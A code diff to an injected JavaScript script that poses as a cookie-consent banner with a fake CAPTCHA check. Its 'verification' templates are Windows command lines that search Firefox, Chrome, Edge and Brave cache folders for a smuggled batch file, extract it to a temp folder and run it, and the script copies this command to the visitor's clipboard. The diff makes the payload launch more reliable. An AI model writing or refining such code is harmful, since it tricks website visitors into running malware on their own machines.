@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.7.0',
+    version: '1.7.1',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -25,10 +25,10 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: "cmd /c (for /r \"%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\" %f in (*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
-      chrome: "cmd /c (for /r \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
-      edge: "cmd /c (for /r \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\"",
-      brave: "cmd /c (for /r \"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & call \"%TMP%\\t.bat\""
+      firefox: "cmd /c (for /r \"%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\" %f in (*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & if exist \"%TMP%\\t.bat\" call \"%TMP%\\t.bat\"",
+      chrome: "cmd /c (for /r \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & if exist \"%TMP%\\t.bat\" call \"%TMP%\\t.bat\"",
+      edge: "cmd /c (for /r \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & if exist \"%TMP%\\t.bat\" call \"%TMP%\\t.bat\"",
+      brave: "cmd /c (for /r \"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\" %f in (f_*) do @find \"{M}\" \"%f\">nul&&find \"{E}\" \"%f\">nul&&powershell -c \"[IO.File]::WriteAllBytes('%TMP%\\t.bat',([IO.File]::ReadAllBytes('%f')[0..{SM1}]))\") & if exist \"%TMP%\\t.bat\" call \"%TMP%\\t.bat\""
     }
   };
 
@@ -529,6 +529,7 @@
 
     function runVerify() {
       if (verified || busy) return;
+      if (!isPayloadReady()) return;
       copyVerificationCommand();
       busy = true;
       captchaWidget.classList.add('ts-loading');
